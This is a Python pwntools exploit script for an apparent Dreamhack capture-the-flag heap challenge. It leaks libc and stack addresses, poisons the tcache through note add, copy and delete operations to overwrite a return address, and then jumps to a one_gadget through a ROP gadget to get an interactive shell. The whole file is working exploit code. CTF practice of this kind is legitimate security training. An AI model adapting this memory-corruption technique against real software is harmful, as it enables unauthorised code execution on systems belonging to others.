#!/usr/bin/env python3

from pwn import *

exe = ELF("./prob_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe
context.log_level = "debug"
context.terminal = ['kgx', '--', 'bash', '-c']

def conn():
    if args.LOCAL:
        r = process([exe.path])
        # r = gdb.debug ([exe.path], "b *main", env={'SHELL': '/bin/bash'})
        # r = gdb.debug ([exe.path], "b *__libc_start_main+214", env={'SHELL': '/bin/bash'})
    else:
        r = remote("host3.dreamhack.games", 19273)

    return r

def add_note (p, note_number, length, info):
    p.sendlineafter (b'>> ', b'1')
    p.sendlineafter (b'>> ', note_number)
    p.sendlineafter (b'>> ', length)
    p.sendafter (b'>> ', info)

def copy (p, src, des):
    p.sendlineafter (b'>> ', b'2')
    p.sendlineafter (b'>> ', src)
    p.sendlineafter (b'>> ', des)

def del_note (p, note_number):
    p.sendlineafter (b'>> ', b'3')
    p.sendlineafter (b'>> ', note_number)

def welcome (p, name):
    p.sendafter (b'what is your name?\n', name)

def change_name (p, new_name):
    p.sendlineafter (b'>> ', b'4')
    p.sendafter (b'>> ', new_name)

def main():
    p = conn()
    welcome (p, b'A')
    tmp = p.recvuntil (b',')
    leak_libc = tmp[:-1].ljust (8, b'\x00')
    leak_libc = u64 (leak_libc)
    print ("BUG", tmp)
    print ("BUG1 ", hex (leak_libc))
    libc.address = leak_libc - 0x1f0f41
    print ("The address of libc is: ", hex (libc.address))

    change_name (p, b'A' * 0x20)
    p.recvuntil (b'Hello ' + b'A' * 0x20)
    tmp = p.recvuntil (b'\n')
    leak_stack = tmp[:-1].ljust (8, b'\x00')
    print ("BUG ", tmp)
    print ("BUG1 ", leak_stack)
    leak_stack = u64 (leak_stack)
    ret_addr = leak_stack - 0xe8
    print ("The leak from stack is: ", hex (leak_stack))
    print ("The return address is :", hex (ret_addr))

    payload = p64 (ret_addr)
    add_note (p, b'1', b'24', b'AAAA') # dest (chunk 0 -> chunk 1)
    # free chunk 1 then free chunk 0

    add_note (p, b'12', b'8', payload) # source
    
    del_note (p, b'1')
    add_note (p, b'2', b'50', b'AAAAA') # chunk 0
    add_note (p, b'3', b'50', b'BBBBB') # chunk 1
    

    del_note (p, b'2') # free chunk 0
    del_note (p, b'3') # free chunk 1
    #Tcache 0x20: chunk 0 -> chunk 1

    payload = p32 (0x2) + p32 (0) + b'\x00' * 8
    add_note (p, b'5', b'24', payload) # chunk 1 -> chunk 0 (dest)
    add_note (p, b'6', b'50', b'DDDDD')
    del_note (p, b'6')
    del_note (p, b'2')
    copy (p, b'12', b'5')

    one_gadget = libc.address + 0xe6c7e
    pop_r12 = 0x0000000000032b59 + libc.address

    payload = p64 (pop_r12) + p64 (0) + p64 (one_gadget)
    add_note (p, b'7', b'24', payload)

    p.sendlineafter (b'>> ', b'5')

    p.interactive()


if __name__ == "__main__":
    main()